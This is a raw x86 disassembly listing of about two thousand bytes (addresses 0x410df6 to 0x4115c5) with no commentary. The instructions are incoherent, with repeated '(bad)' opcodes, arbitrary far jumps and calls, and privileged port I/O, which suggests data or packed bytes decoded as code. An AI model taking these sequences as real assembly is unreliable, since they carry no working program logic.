  410df6:	mov    eax,0x63495e3a
  410dfb:	jecxz  0x410e33
  410dfd:	not    BYTE PTR [edi]
  410dff:	lods   al,BYTE PTR ds:[esi]
  410e00:	inc    esp
  410e01:	inc    ecx
  410e02:	jo     0x410e7f
  410e04:	pop    esp
  410e05:	cmp    al,0xb
  410e07:	in     eax,dx
  410e08:	mov    ecx,0xb0b4d4ae
  410e0d:	mov    cl,0xa
  410e0f:	mov    ah,0xfa
  410e11:	std    
  410e12:	fistp  DWORD PTR [ecx+esi*8+0x436677a6]
  410e19:	jecxz  0x410e4f
  410e1b:	inc    eax
  410e1c:	in     al,0xaa
  410e1e:	mov    edi,0x87973d9a
  410e23:	jmp    0xad93:0xedd6c21a
  410e2a:	mov    ebx,0xb23f4f73
  410e2f:	lahf   
  410e30:	jle    0x410e08
  410e32:	cmp    ebx,DWORD PTR [ebx-0x258df62b]
  410e38:	push   eax
  410e39:	lahf   
  410e3a:	cmp    al,0x46
  410e3c:	pop    es
  410e3d:	pop    edi
  410e3e:	loope  0x410e39
  410e40:	jge    0x410e32
  410e42:	mov    ecx,0x7a0a8276
  410e47:	mov    fs,WORD PTR [ebp+0xa42947]
  410e4d:	inc    ebx
  410e4e:	stos   DWORD PTR es:[edi],eax
  410e4f:	les    ebx,FWORD PTR [ecx-0x75]
  410e52:	popa   
  410e53:	xchg   ebx,eax
  410e54:	xchg   esi,eax
  410e55:	daa    
  410e56:	sub    BYTE PTR [ebx+0x2f],cl
  410e59:	mov    bh,dl
  410e5b:	popf   
  410e5c:	mov    ecx,0x1a81d9b0
  410e61:	dec    esi
  410e62:	ins    DWORD PTR es:[edi],dx
  410e63:	mov    ah,0x73
  410e65:	mov    BYTE PTR [ebx+0x11],ah
  410e68:	adc    cl,BYTE PTR [edi+edi*2-0x385f47d6]
  410e6f:	add    al,0x3a
  410e71:	or     al,0xae
  410e73:	jnp    0x410ec7
  410e75:	das    
  410e76:	pop    ebp
  410e77:	and    al,0xb6
  410e79:	stc    
  410e7a:	outs   dx,BYTE PTR ds:[esi]
  410e7b:	call   0xb447:0x1e5e7992
  410e82:	jns    0x410e3f
  410e84:	in     eax,dx
  410e85:	aaa    
  410e86:	call   0x6b4f806
  410e8b:	dec    ebx
  410e8c:	sub    BYTE PTR [ebp-0x3c],ch
  410e8f:	inc    esi
  410e90:	je     0x410ed8
  410e92:	dec    esp
  410e93:	lea    esi,[ecx]
  410e95:	xchg   edi,eax
  410e96:	xchg   ebx,eax
  410e97:	sbb    DWORD PTR [ecx-0x35],edx
  410e9a:	inc    edi
  410e9b:	inc    edi
  410e9c:	sbb    BYTE PTR [eax],bh
  410e9e:	sar    ebp,1
  410ea0:	mov    eax,0x8dbc0ab2
  410ea5:	mov    bl,0x8b
  410ea7:	mov    eax,ds:0xd7c70788
  410eac:	sbb    BYTE PTR [edx],0xad
  410eaf:	jg     0x410f18
  410eb1:	loop   0x410e7c
  410eb3:	mov    al,0xcc
  410eb5:	loop   0x410f0b
  410eb7:	in     al,0x5e
  410eb9:	fisttp QWORD PTR [edx]
  410ebb:	nop
  410ebc:	push   ebp
  410ebd:	test   al,0xc8
  410ebf:	repz xor DWORD PTR [edi+0x28],ebx
  410ec3:	(bad)  
  410ec4:	lods   al,BYTE PTR ds:[esi]
  410ec5:	lahf   
  410ec6:	push   es
  410ec7:	cmp    al,0xb
  410ec9:	ja     0x410f23
  410ecb:	jmp    0x2762:0xd0a707d0
  410ed2:	dec    eax
  410ed3:	mov    ecx,0x26ad558f
  410ed8:	xor    DWORD PTR [edi],edi
  410eda:	(bad)  
  410edb:	jge    0x410eef
  410edd:	jns    0x410ef8
  410edf:	(bad)
  410ee2:	mov    ebp,0x68adecb8
  410ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ee8:	je     0x410eed
  410eea:	test   al,0x72
  410eec:	pop    es
  410eed:	cwde   
  410eee:	mov    ch,0xd7
  410ef0:	jl     0x410e8a
  410ef2:	or     al,0x31
  410ef4:	xchg   ebx,eax
  410ef5:	test   eax,0x25a709cd
  410efa:	mov    dh,0x28
  410efc:	int3   
  410efd:	ret    0x692d
  410f00:	dec    ebp
  410f01:	aas    
  410f02:	fadd   QWORD PTR [ebp-0x56]
  410f05:	sti    
  410f06:	lahf   
  410f07:	(bad)  
  410f08:	enter  0xfca6,0xf4
  410f0c:	mov    al,0xdd
  410f0e:	push   0x7fa5b21d
  410f13:	jne    0x410ed4
  410f15:	push   0x36
  410f17:	mov    ah,BYTE PTR [edi-0x17]
  410f1a:	mov    esi,0xb1016e25
  410f1f:	sub    ecx,DWORD PTR [ebx]
  410f21:	jle    0x410f41
  410f23:	aaa    
  410f24:	push   ds
  410f25:	mov    ds:0xbcc7079b,al
  410f2a:	dec    eax
  410f2b:	push   esp
  410f2c:	cli    
  410f2d:	cmc    
  410f2e:	push   ebx
  410f2f:	mov    dl,0x1e
  410f31:	mov    ebx,0x44a49e94
  410f36:	pop    ds
  410f37:	js     0x410f3b
  410f39:	mov    ds:0x41a7f401,al
  410f3e:	iret   
  410f3f:	xor    ah,BYTE PTR [ebx-0x62]
  410f42:	icebp  
  410f43:	cld    
  410f44:	xchg   edx,eax
  410f45:	jne    0x410f1c
  410f47:	call   0xece9:0x46618624
  410f4e:	int    0x77
  410f50:	retf   
  410f51:	and    BYTE PTR [ebx+eiz*1-0x4a],dl
  410f55:	and    bl,al
  410f57:	test   DWORD PTR ds:0x5e59a174,0x670b6035
  410f61:	pop    esp
  410f62:	ret    0xdd65
  410f65:	sbb    DWORD PTR [esi],0xffffff80
  410f68:	jg     0x410f7b
  410f6a:	xor    BYTE PTR [ebx-0xeab2c53],bl
  410f70:	lds    ebp,FWORD PTR [edi]
  410f72:	out    0x3a,eax
  410f74:	std    
  410f75:	test   DWORD PTR [eax+0x314182fb],ecx
  410f7b:	mov    dl,0xf1
  410f7d:	jae    0x410fd6
  410f7f:	scas   eax,DWORD PTR es:[edi]
  410f80:	adc    al,0xa
  410f82:	das    
  410f83:	dec    edx
  410f84:	int    0xfb
  410f86:	test   al,0x7e
  410f88:	mov    ds:0xcea934a4,al
  410f8d:	mov    eax,ds:0xce0ec62f
  410f92:	test   DWORD PTR [eax+0x4e58e91b],esi
  410f98:	mov    eax,0xc3510df7
  410f9d:	stos   DWORD PTR es:[edi],eax
  410f9e:	call   0x8b7b:0x35ee2ed4
  410fa5:	sub    DWORD PTR [edx],esp
  410fa7:	mov    bl,0x85
  410fa9:	jecxz  0x410f55
  410fab:	and    dh,ch
  410fad:	sub    BYTE PTR [edi],dh
  410faf:	dec    esi
  410fb0:	and    ah,BYTE PTR [ecx-0x1ef1892f]
  410fb6:	add    DWORD PTR [ebp-0x2a199059],esp
  410fbc:	pop    es
  410fbd:	dec    edx
  410fbe:	cmc    
  410fbf:	in     al,0x1d
  410fc1:	jns    0x410f57
  410fc3:	fstp   TBYTE PTR [eax+0x13]
  410fc7:	mov    cl,0xc
  410fc9:	js     0x410f9c
  410fcb:	scas   al,BYTE PTR es:[edi]
  410fcc:	add    ah,ah
  410fce:	dec    ecx
  410fcf:	stc    
  410fd0:	jne    0x411045
  410fd2:	add    cl,bl
  410fd4:	call   DWORD PTR [edx]
  410fd6:	das    
  410fd7:	cs out 0x4f,eax
  410fda:	push   eax
  410fdb:	xor    BYTE PTR [edi-0x78],al
  410fde:	jmp    0x6df1:0xf3891b6
  410fe5:	je     0x410f93
  410fe7:	push   esp
  410fe8:	push   eax
  410fe9:	push   ds
  410fea:	mov    esp,0xebb03eb1
  410fef:	nop
  410ff0:	cs dec edx
  410ff2:	mov    ah,0xbd
  410ff4:	inc    ebx
  410ff5:	lods   eax,DWORD PTR ds:[esi]
  410ff6:	call   0x99ad4a46
  410ffb:	adc    al,0xfe
  410ffd:	les    esp,FWORD PTR [edi+0x27f2b1b4]
  411003:	jb     0x411032
  411005:	ja     0x411029
  411007:	pop    ebx
  411008:	aas    
  411009:	push   edx
  41100a:	xchg   edx,eax
  41100b:	mov    edi,?
  41100d:	js     0x411011
  41100f:	or     bl,BYTE PTR [ecx]
  411011:	into   
  411012:	jae    0x41104a
  411014:	fst    st(6)
  411016:	mov    ds:0x20738afa,eax
  41101b:	test   al,0x25
  41101d:	repnz pop edi
  41101f:	jmp    0x410fa8
  411021:	pop    esi
  411022:	(bad)  
  411024:	xlat   BYTE PTR ds:[ebx]
  411025:	leave  
  411026:	jo     0x41100a
  411028:	data16 jecxz 0x410fe4
  41102b:	add    edi,DWORD PTR [esi+0x2eeade3d]
  411031:	mov    esi,0xff8f1992
  411036:	(bad)  
  411039:	test   DWORD PTR [edx-0x59],0xc6ccd6d4
  411040:	xlat   BYTE PTR ds:[ebx]
  411041:	pop    esp
  411042:	or     DWORD PTR [edi+0x7a],ecx
  411045:	and    bh,BYTE PTR [eax-0xfffd91a]
  41104b:	inc    eax
  41104c:	jg     0x411094
  41104e:	jno    0x411056
  411050:	bound  eax,QWORD PTR [ecx+0x796c202d]
  411056:	push   eax
  411057:	cmp    esp,DWORD PTR [esp+ebx*8-0xc]
  41105b:	out    dx,al
  41105c:	sbb    edx,DWORD PTR [edi]
  41105e:	mov    bl,BYTE PTR [ecx+0x4620b5db]
  411064:	jmp    0x4110c3
  411066:	lea    esi,[esi]
  411068:	add    edi,DWORD PTR [ebx+0x6e]
  41106b:	lods   al,BYTE PTR ds:[esi]
  41106c:	test   DWORD PTR [edx+0x1],edx
  41106f:	mov    ebx,0xc45c660e
  411074:	mov    ebx,0xfc5c33fc
  411079:	inc    ebx
  41107a:	inc    edx
  41107b:	fstp   DWORD PTR [eax+esi*8+0x56]
  41107f:	dec    ax
  411081:	shr    BYTE PTR [edi+ecx*1+0x6103872f],0x0
  411089:	into   
  41108a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41108b:	into   
  41108c:	mov    ah,0x7a
  41108e:	ins    DWORD PTR es:[edi],dx
  41108f:	mov    DWORD PTR [edi-0x6379c767],0x87fc1136
  411099:	sub    ebp,edi
  41109b:	cmp    al,0x3f
  41109d:	inc    ecx
  41109e:	adc    dl,bh
  4110a0:	retf   0x9ce
  4110a3:	jecxz  0x4110ad
  4110a5:	(bad)  
  4110a6:	fnstenv [ebp+0x69715b06]
  4110ac:	xor    ch,al
  4110ae:	inc    ecx
  4110af:	mov    bh,0xb4
  4110b1:	call   0xab9c:0x6063c7ff
  4110b8:	iret   
  4110b9:	fiadd  DWORD PTR [ecx+0xafc619b]
  4110bf:	sub    BYTE PTR [ebp-0x2c],0x0
  4110c3:	mov    esi,0xd5f5904d
  4110c8:	dec    edi
  4110c9:	adc    bh,BYTE PTR [ebx-0x55bebb25]
  4110cf:	popa   
  4110d0:	add    DWORD PTR [edx+0x3d07cd20],ebx
  4110d6:	mov    DWORD PTR ds:0xeb4fcab7,ecx
  4110dc:	or     esp,DWORD PTR [ebx-0x7097c019]
  4110e2:	jmp    0x51bcca8b
  4110e7:	pop    es
  4110e8:	push   0x7e
  4110ea:	xor    DWORD PTR [eax+ecx*2+0x6e],esi
  4110ee:	mov    dh,0xc0
  4110f0:	push   0x2e01d170
  4110f5:	mov    ebx,eax
  4110f7:	sbb    BYTE PTR es:[eax],0x8d
  4110fb:	lds    edi,FWORD PTR [edi]
  4110fd:	dec    edx
  4110fe:	xor    edx,eax
  411100:	jae    0x411098
  411102:	jno    0x4110ce
  411104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411105:	dec    ecx
  411106:	mov    ebp,0x2d596e13
  41110b:	mov    bh,0x39
  41110d:	ret    0xf977
  411110:	xchg   edi,eax
  411111:	(bad)  
  411112:	retf   0xb8ce
  411115:	adc    cl,ch
  411117:	push   eax
  411118:	pop    eax
  411119:	(bad)  
  41111a:	cli    
  41111b:	add    bl,dh
  41111d:	imul   eax,DWORD PTR [edi+0x9],0x9d5d3fb4
  411124:	xor    BYTE PTR [ecx],dh
  411126:	enter  0x158a,0xe
  41112a:	xor    BYTE PTR fs:[ecx-0x61de4c44],0xcf
  411132:	dec    edi
  411133:	push   es
  411134:	dec    ebp
  411135:	pop    ss
  411136:	shl    ecx,1
  411138:	xchg   DWORD PTR [ebp+eiz*1-0x5b],eax
  41113c:	mov    esp,0x4224c312
  411141:	and    eax,0x30d842af
  411146:	(bad)
  41114b:	(bad)  
  41114c:	jecxz  0x411191
  41114e:	adc    eax,0x6dbca7a9
  411153:	mov    dh,0x2b
  411155:	fisub  WORD PTR [ecx-0x4a]
  411158:	loopne 0x4111a6
  41115a:	jne    0x4111d8
  41115c:	jae    0x4111d3
  41115e:	sub    DWORD PTR [ecx],esi
  411160:	or     dh,BYTE PTR [ecx+eiz*4+0x27e22840]
  411167:	clc    
  411168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411169:	mov    ah,0x70
  41116b:	push   ds
  41116c:	sub    DWORD PTR [ebp+0x1829ebdb],edi
  411172:	dec    ebp
  411173:	mov    ch,0xd7
  411175:	mov    BYTE PTR [ebx-0x67],al
  411178:	pop    ecx
  411179:	sbb    al,BYTE PTR [esi]
  41117b:	jns    0x411196
  41117d:	and    esp,DWORD PTR es:[edi+eiz*2+0x3a]
  411182:	out    dx,eax
  411183:	mov    WORD PTR [ebx+0x4f],es
  411186:	xchg   esp,eax
  411187:	sub    al,0x66
  411189:	sub    DWORD PTR [edx+0x50a9f7f9],edx
  41118f:	inc    BYTE PTR [edx+0xb7361f6]
  411195:	call   0x2d70:0xb27f0586
  41119c:	rcl    DWORD PTR [edi-0x1a],1
  41119f:	pop    edx
  4111a0:	(bad)  
  4111a1:	xor    BYTE PTR [ecx-0x48],ah
  4111a4:	or     ebp,DWORD PTR ds:0xc290dec3
  4111aa:	sbb    DWORD PTR [ebx+0x36],edx
  4111ad:	push   cs
  4111ae:	adc    al,0x83
  4111b0:	jge    0x4111ce
  4111b2:	and    ebp,ecx
  4111b4:	lock pop ds
  4111b6:	shr    DWORD PTR cs:[edi+eax*1-0x17959717],0xe3
  4111bf:	xchg   esp,eax
  4111c0:	adc    BYTE PTR [ecx],dh
  4111c2:	pop    eax
  4111c3:	inc    edx
  4111c4:	popa   
  4111c5:	cmp    ebp,DWORD PTR [edx+0x45]
  4111c8:	cdq    
  4111c9:	pop    ss
  4111ca:	pusha  
  4111cb:	sub    BYTE PTR [edx+ebp*1],bh
  4111ce:	jl     0x411193
  4111d0:	mov    dl,0xd6
  4111d2:	lahf   
  4111d3:	mov    DWORD PTR [ebx],ebx
  4111d5:	jg     0x411239
  4111d7:	cs into 
  4111d9:	or     DWORD PTR [edi-0x78],esi
  4111dc:	mov    ecx,0xce59b06d
  4111e1:	stc    
  4111e2:	mov    al,ds:0xdb11a227
  4111e7:	sub    edi,0x69
  4111ea:	adc    eax,0xb0812fa1
  4111ef:	xor    BYTE PTR [eax+ebx*2+0x31],ah
  4111f3:	ins    DWORD PTR es:[edi],dx
  4111f4:	mov    esp,0x132e9848
  4111f9:	retf   
  4111fa:	or     ch,BYTE PTR [esp]
  4111fd:	stos   DWORD PTR es:[edi],eax
  4111fe:	push   edx
  4111ff:	sbb    BYTE PTR [ebx],bh
  411201:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  411203:	call   0x3bca:0x683af960
  41120a:	push   esp
  41120b:	pop    ebp
  41120c:	lahf   
  41120d:	push   0xffffffff
  41120f:	dec    edx
  411210:	inc    ebx
  411211:	iret   
  411212:	mov    DWORD PTR [edx+ebx*2],ebp
  411215:	dec    ebp
  411216:	int3   
  411217:	or     ecx,DWORD PTR [edx+0x6d]
  41121a:	xlat   BYTE PTR ds:[ebx]
  41121b:	jg     0x411242
  41121d:	addr16 sbb al,0xf2
  411220:	bound  edx,QWORD PTR [ecx-0x1b]
  411223:	idiv   BYTE PTR [edx-0x3f]
  411226:	xchg   bl,cl
  411228:	daa    
  411229:	shr    DWORD PTR [ebp+0x4495734e],1
  41122f:	jmp    0xb0a5:0xc7a2cc8a
  411236:	aam    0x45
  411238:	mov    edx,0xab144232
  41123d:	mov    BYTE PTR [eax+0x686a9421],al
  411243:	inc    eax
  411244:	and    eax,0xf01badb4
  411249:	(bad)  
  41124a:	pop    ss
  41124b:	call   0x55f2958c
  411250:	lds    ecx,FWORD PTR [edi+edx*1]
  411253:	jne    0x411273
  411255:	lea    edx,[ebp-0x7fd5fee6]
  41125b:	jp     0x41129e
  41125d:	mov    es,WORD PTR [eax-0x6fd96d44]
  411263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411264:	aaa    
  411265:	fild   DWORD PTR [ecx-0x30]
  411268:	arpl   WORD PTR [edi+0x5e],di
  41126b:	sahf   
  41126c:	loop   0x411290
  41126e:	(bad)  
  41126f:	mov    edx,0x9fe9f21a
  411274:	cld    
  411275:	mov    dh,0x82
  411277:	inc    edi
  411278:	(bad)
  41127b:	ins    DWORD PTR es:[edi],dx
  41127c:	lock scas al,BYTE PTR es:[edi]
  41127e:	mov    eax,ds:0x96a7e369
  411283:	sub    al,0x57
  411285:	or     bl,BYTE PTR [ecx-0x7912176d]
  41128b:	mov    al,ds:0x1da3c52b
  411290:	adc    dl,dh
  411292:	test   al,0xa6
  411294:	mov    dl,0x8e
  411296:	mov    esp,0x90cccdb4
  41129b:	or     al,0xf2
  41129d:	fcomp  st(2)
  41129f:	enter  0x3820,0x97
  4112a3:	retf   
  4112a4:	cli    
  4112a5:	dec    esi
  4112a6:	in     eax,0x3a
  4112a8:	std    
  4112a9:	xchg   esp,eax
  4112aa:	retf   
  4112ab:	pop    eax
  4112ac:	sbb    ch,al
  4112ae:	jecxz  0x411262
  4112b0:	fprem  
  4112b2:	cli    
  4112b3:	daa    
  4112b4:	(bad)  
  4112b5:	ja     0x41131a
  4112b7:	xor    esp,ebp
  4112b9:	mov    esi,0x1183f3e6
  4112be:	sub    eax,0xa0e5484d
  4112c3:	cmp    al,0xc
  4112c5:	aas    
  4112c6:	outs   dx,BYTE PTR ds:[esi]
  4112c7:	mov    ds:0x3b47c5f,eax
  4112cc:	sar    BYTE PTR [ecx+ebx*1+0x65],cl
  4112d0:	jl     0x411338
  4112d2:	bound  edi,QWORD PTR [edx]
  4112d4:	mov    ebp,0x452d28fc
  4112d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112da:	lahf   
  4112db:	mov    al,0xb8
  4112dd:	push   eax
  4112de:	inc    esp
  4112df:	cmp    edi,DWORD PTR [eax-0x41]
  4112e2:	or     ebp,DWORD PTR [ebx-0x1c]
  4112e5:	mov    al,ds:0xfa531723
  4112ea:	xchg   ecx,eax
  4112eb:	call   0xb19fcf12
  4112f0:	imul   esi,esi,0xffffffb0
  4112f3:	bound  edx,QWORD PTR [ecx+0x47]
  4112f6:	mov    BYTE PTR [eax-0x55d947a4],cl
  4112fc:	je     0x4112fe
  4112fe:	or     eax,0xd68760c8
  411303:	call   0xd9384826
  411308:	cmp    DWORD PTR [ebp+0x21],eax
  41130b:	push   0xfffffffe
  41130d:	cmp    ecx,esi
  41130f:	popf   
  411310:	cmp    eax,DWORD PTR [ebx+0x241b67e5]
  411316:	ss push 0xb182407d
  41131c:	rcr    DWORD PTR [esi-0x63],1
  41131f:	pop    edx
  411320:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411321:	push   ebp
  411322:	and    al,0xb1
  411324:	ins    DWORD PTR es:[edi],dx
  411325:	stos   DWORD PTR es:[edi],eax
  411326:	loope  0x41137d
  411328:	sbb    BYTE PTR [eax-0x44],dh
  41132b:	data16 loop 0x411393
  41132e:	push   0x4f251b9c
  411333:	stos   DWORD PTR es:[edi],eax
  411334:	imul   ebp,ebx,0x25
  411337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411338:	sbb    BYTE PTR [esi+0x23],bh
  41133b:	mov    dl,0x17
  41133d:	push   ebx
  41133e:	out    0x9d,eax
  411340:	push   ebx
  411341:	pop    esi
  411342:	inc    esi
  411343:	ja     0x4113aa
  411345:	cmp    DWORD PTR [edx-0x7d35caf2],esp
  41134b:	repz sar ah,0xfc
  41134f:	mov    al,0x87
  411351:	pop    ss
  411352:	aas    
  411353:	clc    
  411354:	and    al,0x35
  411356:	lock inc ebp
  411358:	jbe    0x411327
  41135a:	mov    ds:0xf8b62d26,eax
  41135f:	imul   edi,DWORD PTR [edi+0x76],0xffffffe7
  411363:	repnz xor edx,DWORD PTR [ebp-0x35]
  411367:	pop    esi
  411368:	pop    es
  411369:	lea    ecx,[edx+ecx*4-0x7]
  41136d:	dec    esi
  41136e:	addr16 push 0x32
  411371:	shl    BYTE PTR [esi],cl
  411373:	mov    eax,0xa9e9e1af
  411378:	jne    0x411376
  41137a:	and    ebp,ebp
  41137c:	rcl    BYTE PTR [ebx-0x7d],0x81
  411380:	sub    al,0xd9
  411382:	enter  0xaecf,0xc7
  411386:	jp     0x411329
  411388:	add    ecx,DWORD PTR [ebx+esi*2-0x5c]
  41138c:	lds    ebp,FWORD PTR [esi+ecx*1]
  41138f:	dec    esp
  411390:	loopne 0x4113e9
  411392:	pop    es
  411393:	repz push edx
  411395:	lods   al,BYTE PTR ds:[si]
  411397:	cmp    eax,0xd65c780c
  41139c:	jmp    0x41138a
  41139e:	popf   
  41139f:	dec    edx
  4113a0:	cs test eax,0x781fce08
  4113a6:	or     esi,DWORD PTR [edi+0x1f]
  4113a9:	out    dx,al
  4113aa:	pop    ds
  4113ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113ac:	lods   al,BYTE PTR ds:[esi]
  4113ad:	int    0x15
  4113af:	jecxz  0x4113de
  4113b1:	mov    al,ds:0x3cb695a0
  4113b6:	loop   0x4113c1
  4113b8:	inc    ebx
  4113b9:	adc    edx,DWORD PTR [eax-0x2c5496e4]
  4113bf:	sub    al,0x58
  4113c1:	icebp  
  4113c2:	outs   dx,DWORD PTR ds:[esi]
  4113c3:	call   0x141:0x5e2dd235
  4113ca:	and    esi,DWORD PTR [ecx-0x61313562]
  4113d0:	cs xchg esp,eax
  4113d2:	inc    ebx
  4113d3:	arpl   WORD PTR [ebp-0x46],sp
  4113d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113d7:	dec    ebp
  4113d8:	into   
  4113d9:	sub    eax,eax
  4113db:	lods   al,BYTE PTR ds:[esi]
  4113dc:	and    al,0x3a
  4113de:	mov    ch,0x6e
  4113e0:	cmp    edi,esi
  4113e2:	mov    ebx,0xa37aa227
  4113e7:	shl    BYTE PTR ds:0xbfbfbaba,cl
  4113ed:	xor    ebp,edx
  4113ef:	jae    0x4113be
  4113f1:	xchg   ebp,eax
  4113f2:	shl    BYTE PTR [ebx],0x5b
  4113f5:	je     0x41139f
  4113f7:	xor    eax,0x63ac8fcc
  4113fc:	loop   0x411459
  4113fe:	fsub   QWORD PTR ds:0xa45062e
  411404:	add    ebp,edx
  411406:	repnz leave 
  411408:	xchg   esp,eax
  411409:	sbb    BYTE PTR [esi],0x8
  41140c:	mov    al,ds:0xcff53432
  411411:	les    ebp,FWORD PTR [eax]
  411413:	sahf   
  411414:	mov    ds:0x5602137e,al
  411419:	sbb    DWORD PTR [ecx-0x7604738e],ebp
  41141f:	lods   al,BYTE PTR ds:[esi]
  411420:	fwait
  411421:	mov    eax,ds:0x43f490c
  411426:	rol    DWORD PTR [edi+0x33],0x74
  41142a:	outs   dx,BYTE PTR ds:[esi]
  41142b:	xor    DWORD PTR [eax],ebx
  41142d:	(bad)  
  41142e:	cmp    eax,0x82bf718c
  411433:	fnstenv [eax+0x31]
  411436:	call   0xdb49:0x3d47aa13
  41143d:	inc    esi
  41143e:	jno    0x411447
  411440:	jae    0x41149c
  411442:	mov    dl,BYTE PTR [bp+di]
  411445:	dec    eax
  411446:	mov    WORD PTR [edi],ss
  411448:	mov    ah,0xb5
  41144a:	es jge 0x4114b9
  41144d:	pop    es
  41144e:	and    bh,BYTE PTR [edx+0x7e]
  411451:	fcmovnbe st,st(6)
  411453:	dec    ebx
  411455:	sub    eax,0x6a21e76c
  41145a:	mov    BYTE PTR [edx+0x7f],al
  41145d:	lods   eax,DWORD PTR ds:[esi]
  41145e:	bound  eax,QWORD PTR [ecx+0x53]
  411461:	ins    BYTE PTR es:[edi],dx
  411462:	int3   
  411463:	push   0x26e6b5a6
  411468:	popa   
  411469:	inc    edi
  41146a:	es sbb al,al
  41146d:	popa   
  41146e:	ja     0x4114e3
  411470:	aam    0xcc
  411472:	in     al,dx
  411473:	mov    eax,ds:0xe5b0efab
  411478:	push   cs
  411479:	dec    edx
  41147a:	or     al,0x3a
  41147c:	retf   0x338e
  41147f:	bnd jo 0x4114c7
  411482:	xchg   dl,bl
  411484:	sbb    esp,esi
  411486:	dec    edx
  411487:	push   0x5fd30214
  41148c:	daa    
  41148d:	test   dh,bl
  41148f:	mov    esp,0xf87f1c47
  411494:	and    al,0xa8
  411496:	mov    bl,0xd2
  411498:	mov    esp,0xf6f458a
  41149d:	inc    edx
  41149e:	fisubr WORD PTR [ebx]
  4114a0:	pusha  
  4114a1:	loop   0x411490
  4114a3:	dec    edx
  4114a4:	(bad)  
  4114a5:	adc    eax,0x24d4a0d5
  4114aa:	js     0x411431
  4114ac:	adc    BYTE PTR [esi-0x572be22],cl
  4114b2:	scas   eax,DWORD PTR es:[edi]
  4114b3:	retf   0xe8e6
  4114b6:	rcr    BYTE PTR [ecx],1
  4114b8:	leave  
  4114b9:	sbb    ch,BYTE PTR [ecx-0x12]
  4114bc:	int    0x4b
  4114be:	jecxz  0x411513
  4114c0:	shl    DWORD PTR [ebx],0xc5
  4114c3:	ins    BYTE PTR es:[edi],dx
  4114c4:	ret    0x5569
  4114c7:	pop    ss
  4114c8:	adc    DWORD PTR [edi],esi
  4114ca:	pop    eax
  4114cb:	push   ebp
  4114cc:	fs inc esi
  4114ce:	mov    edi,es
  4114d0:	xchg   ebx,eax
  4114d1:	push   edi
  4114d2:	fist   DWORD PTR [edx]
  4114d4:	inc    eax
  4114d5:	add    al,0x83
  4114d7:	jg     0x411501
  4114d9:	sbb    bh,BYTE PTR [edi-0xd]
  4114dc:	addr16 push edi
  4114de:	jo     0x411471
  4114e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114e1:	inc    eax
  4114e2:	xchg   BYTE PTR [ebx+eax*2],bl
  4114e5:	fisttp QWORD PTR ds:0xf8a2ab36
  4114eb:	inc    ebx
  4114ec:	and    edx,DWORD PTR [ebp+0x28]
  4114ef:	dec    edi
  4114f0:	std    
  4114f1:	cld    
  4114f2:	test   dh,bl
  4114f4:	loopne 0x411557
  4114f6:	loop   0x4114bf
  4114f8:	clc    
  4114f9:	(bad)  
  4114fa:	arpl   WORD PTR [edi-0x47d0c35a],dx
  411500:	into   
  411501:	jbe    0x41150b
  411503:	inc    ebx
  411504:	neg    edx
  411506:	or     al,0x9e
  411508:	inc    ebp
  411509:	add    al,0xaf
  41150b:	imul   ebp,DWORD PTR [edi],0xffffffd6
  41150e:	sbb    ecx,esp
  411510:	adc    bl,cl
  411512:	lds    ecx,FWORD PTR [ebx+0x4f]
  411515:	cmp    edi,DWORD PTR [eax-0x45]
  411518:	dec    ecx
  411519:	mov    cl,0xae
  41151b:	dec    ecx
  41151c:	pop    ebx
  41151d:	xchg   edx,eax
  41151e:	sbb    eax,0xa8806a7
  411523:	xchg   BYTE PTR es:[edx-0x1f],bh
  411527:	and    BYTE PTR [eax+edx*8-0x2b2aeb59],ch
  41152e:	mov    BYTE PTR [edx+0x4b],dl
  411531:	ja     0x411544
  411533:	data16 mov bl,0xaa
  411536:	jo     0x4114bb
  411538:	dec    ebp
  411539:	nop
  41153a:	fst    QWORD PTR ds:0x5401dc37
  411540:	jl     0x411556
  411542:	sub    bh,al
  411544:	cmp    al,0x40
  411546:	push   edx
  411547:	stos   DWORD PTR es:[edi],eax
  411548:	scas   al,BYTE PTR es:[edi]
  411549:	push   0xffffff84
  41154b:	fnstcw WORD PTR [eax-0x61]
  41154e:	dec    edi
  41154f:	out    0xbb,al
  411551:	sub    ecx,eax
  411553:	(bad)  
  411554:	out    dx,eax
  411555:	dec    edx
  411556:	inc    esp
  411557:	aas    
  411558:	add    eax,DWORD PTR [ebp+0x4]
  41155b:	xchg   ebx,eax
  41155c:	cmp    eax,0x89027be7
  411561:	mov    edi,0xf4da2c2c
  411566:	in     al,0xcc
  411568:	ret    
  411569:	ins    BYTE PTR es:[edi],dx
  41156a:	xlat   BYTE PTR ds:[ebx]
  41156b:	in     eax,0xcd
  41156d:	out    0xf5,al
  41156f:	sti    
  411570:	test   al,0x32
  411572:	outs   dx,DWORD PTR ds:[esi]
  411573:	pop    es
  411574:	daa    
  411575:	jmp    0x4312efb8
  41157a:	setno  BYTE PTR [esi+edi*2+0x45]
  41157f:	cmp    edi,esi
  411581:	add    BYTE PTR [ecx+0x5700dafd],al
  411587:	cmp    BYTE PTR [eax+eax*1-0x4aabbbce],ch
  41158e:	scas   eax,DWORD PTR es:[edi]
  41158f:	cmp    ebx,DWORD PTR [edi-0x27972897]
  411595:	mov    eax,0x3247243f
  41159a:	ret    0x1dc
  41159d:	xchg   esp,eax
  41159e:	hlt    
  41159f:	les    esp,FWORD PTR [ebx]
  4115a1:	rol    DWORD PTR [ebx+0x7],1
  4115a4:	pop    esi
  4115a5:	fisttp WORD PTR [ecx+eiz*8-0x6978cace]
  4115ac:	(bad)  
  4115ad:	adc    BYTE PTR [edx-0x366e6e25],0x34
  4115b4:	add    al,0xae
  4115b6:	(bad)  
  4115b8:	and    eax,DWORD PTR [ebp+eax*4+0x11]
  4115bc:	in     eax,0x95
  4115be:	inc    ecx
  4115bf:	test   bl,cl
  4115c1:	sahf   
  4115c2:	ret    0x3e81
  4115c5:	sbb    bh,BYTE PTR [edi-0x1cb1456f]
